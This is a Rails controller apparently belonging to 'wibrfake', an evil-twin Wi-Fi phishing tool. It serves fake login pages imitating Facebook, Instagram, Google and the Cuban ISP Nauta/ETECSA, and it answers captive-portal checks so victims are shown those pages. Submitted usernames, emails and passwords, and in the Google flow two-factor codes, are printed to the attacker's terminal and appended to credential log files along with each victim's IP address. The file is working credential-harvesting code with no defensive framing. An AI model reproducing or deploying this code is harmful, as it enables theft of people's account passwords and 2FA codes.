class SessionsController < ApplicationController
    def generate_204
        session[:page_state] = '204'
        head :no_content
    end
    def wibrfake
        render 'sessions/wibrfake/wibrfake'
    end
    def wibrfake_about
        render 'sessions/wibrfake/about/about'
    end




    def index
        render "index"
    end
  
    def basic
        render 'sessions/basic/basic'
    end
  
    def nauta_etecsa
        render 'sessions/nauta_etecsa/nauta_etecsa'
    end

    def nauta_hogar
        render 'sessions/nauta_hogar/nauta_hogar'
    end

    def facebook
        render 'sessions/facebook/facebook'
    end

    def instagram
        render 'sessions/instagram/instagram'
    end

    def google
        render 'sessions/google/google'
    end
  
    def basic_login
        save_credentials(request.remote_ip, params[:username], params[:email], params[:password], 'Basic')
        
    end
  
    def nauta_etecsa_login
        save_credentials(request.remote_ip, params[:username], params[:email], params[:password], 'Nauta Etecsa')
    end

    def nauta_hogar_login
        save_credentials(request.remote_ip, params[:username], params[:email], params[:password], 'Nauta Hogar')
    end

    def facebook_login
        save_credentials(request.remote_ip, params[:username], params[:email], params[:password], 'Facebook')
    end

    def instagram_login
        save_credentials(request.remote_ip, params[:username], params[:email], params[:password], 'Instagram')
    end

    def google_login
        if(!params[:dfa].nil?)
            puts "\n\r{"
            puts "\r\tlogin: Google"
            puts "\r\tip: #{request.remote_ip}"
            puts "\r\tTwo-Factor Authentication (2FA): #{params[:dfa]}"
            puts "\r}"
            puts "\n"
            print "\r\033[38;5;236m\e[0m\033[48;5;236m \033[38;5;196mwibrfake  #{ENV['IFACE']} \e[0m\033[38;5;236m\e[0m "
            redirect_to '/google'
        else
            save_credentials(request.remote_ip, params[:username], params[:email], params[:password], 'Google')
        end
    end

    private
  
    def save_credentials(ip, username, email, password, login)
        route_credential = ENV['CREDENTIAL_ROUTE']
        iface = ENV['IFACE']
        id = ENV['ID']
        puts "\n\r{"
        puts "\r\tlogin: #{login}"
        puts "\r\tip: #{ip}"
        puts "\r\tUser: #{username}" if email.nil?
        puts "\r\tEmail: #{email}" if username.nil?
        puts "\r\tPassword: #{password}"
        puts "\r}"
        puts "\n"
        print "\r\033[38;5;236m\e[0m\033[48;5;236m \033[38;5;196mwibrfake  #{iface} \e[0m\033[38;5;236m\e[0m "

        unless(route_credential.nil?)
            File.open(route_credential, 'a'){|file|
                file.puts "{"
                file.puts "\tlogin: #{login}"
                file.puts "\tip: #{ip}"
                file.puts "\tuser: #{username}" if email.nil?
                file.puts "\temail: #{email}" if username.nil?
                file.puts "\tpassword: #{password}"
                file.puts "}"
            }
        end
        File.open(File.join(File.dirname(__FILE__), '..', '..', 'lib', 'wibrfake', 'Tmp', id, 'credentials', 'credentials.log'), 'a') do |file|
            file.puts "#{Time.now} IP: #{ip}, Username: #{username}, Email: #{email}, Password: #{password}"
        end
    end
end